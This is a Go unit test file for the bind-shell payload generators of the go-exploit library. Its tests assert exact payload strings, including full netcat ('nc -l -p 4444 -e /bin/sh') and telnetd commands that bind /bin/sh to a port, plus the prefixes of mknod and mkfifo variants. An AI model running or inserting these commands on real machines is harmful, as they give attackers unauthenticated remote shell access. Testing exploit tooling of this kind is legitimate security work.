package bindshell_test

import (
	"strings"
	"testing"

	"github.com/vulncheck-oss/go-exploit/payload/bindshell"
)

func TestBindShellNetcatGaping(t *testing.T) {
	payload := bindshell.Netcat.Gaping(4444)

	if payload != "nc -l -p 4444 -e /bin/sh" {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestBindShellTelnetdLogin(t *testing.T) {
	payload := bindshell.Telnet.TelnetdLogin(1270)

	if payload != "telnetd -l /bin/sh -p 1270" {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestBindShellNetcatMknod(t *testing.T) {
	payload := bindshell.Netcat.Mknod(1270)

	if !strings.HasPrefix(payload, "cd /tmp; mknod ") {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestBindShellNetcatMkfifo(t *testing.T) {
	payload := bindshell.Netcat.Mkfifo(1270)

	if !strings.HasPrefix(payload, "cd /tmp; mkfifo ") {
		t.Fatal(payload)
	}

	t.Log(payload)
}
